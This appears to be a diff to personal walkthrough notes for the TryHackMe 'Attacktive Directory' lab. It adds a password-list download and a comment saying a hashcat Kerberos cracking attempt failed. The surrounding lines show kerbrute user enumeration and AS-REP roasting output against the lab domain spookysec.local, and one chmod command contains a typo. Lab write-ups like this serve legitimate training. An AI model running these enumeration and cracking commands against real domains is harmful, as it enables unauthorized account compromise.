@@ -414,6 +414,7 @@ https://tryhackme.com/room/attacktivedirectory
 >wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64 -O kerbrute
 >chmod +x kernrute
 >wget https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/userlist.txt -O user_list.txt
+>wget https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/passwordlist.txt -O password_list.txt
 >./kerbrute userenum --dc spookysec.local -d spookysec.local user_list.txt
          __             __               __     
         / /_____  _____/ /_  _______  __/ /____ 
@@ -467,7 +468,7 @@ https://tryhackme.com/room/attacktivedirectory
         [-] User ori@spookysec.local doesn't have UF_DONT_REQUIRE_PREAUTH set
         [-] User ROBIN@spookysec.local doesn't have UF_DONT_REQUIRE_PREAUTH set
 
->hashcat -m 7500 hash ./password_list.txt
+>hashcat -m 7500 hash ./password_list.txt //failed not sure why! John to the rescue! (next step)
         hashcat (v6.1.1-66-g6a419d06) starting...
 
         * Device #2: Outdated POCL OpenCL driver detected!
